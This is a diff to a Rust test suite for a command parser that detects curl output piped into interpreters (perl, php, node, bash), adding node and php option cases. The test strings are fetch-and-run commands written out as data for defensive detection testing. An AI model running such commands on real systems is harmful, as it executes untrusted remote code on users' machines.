@@ -101,6 +101,10 @@ fn interpreter_options_are_read_per_family_before_the_program() {
         "curl -sL https://example.com/x | perl -MJSON",
         "curl -sL https://example.com/x | perl -M strict",
         "curl -sL https://example.com/x | php -- arg",
+        "curl -sL https://example.com/x | node --input-type=commonjs",
+        "curl -sL https://example.com/x | node --input-type module",
+        "curl -sL https://example.com/x | node --no-warnings --require ./preload.js -",
+        "curl -sL https://example.com/x | php --no-php-ini --define a=1",
         "curl -sL https://example.com/x | perl -c",
         "curl -sL https://example.com/x | php -c php.ini",
         "curl -sL https://example.com/x | bash -- -",
@@ -129,6 +133,9 @@ fn version_help_and_script_operands_do_not_read_a_program_from_stdin() {
         "curl -s https://example.com/x | dash -O extglob",
         "curl -s https://example.com/x | dash --rcfile rc.sh",
         "curl -s https://example.com/x | python3 -- script.py",
+        "curl -s https://example.com/x | node --input-type=module script.mjs",
+        "curl -s https://example.com/x | node --eval 'process.stdin.pipe(process.stdout)'",
+        "curl -s https://example.com/x | node --unknown-option",
     ] {
         let model = parse_command(&request(command)).unwrap();
         assert_eq!(pipe_attack(&model), None, "{command}");
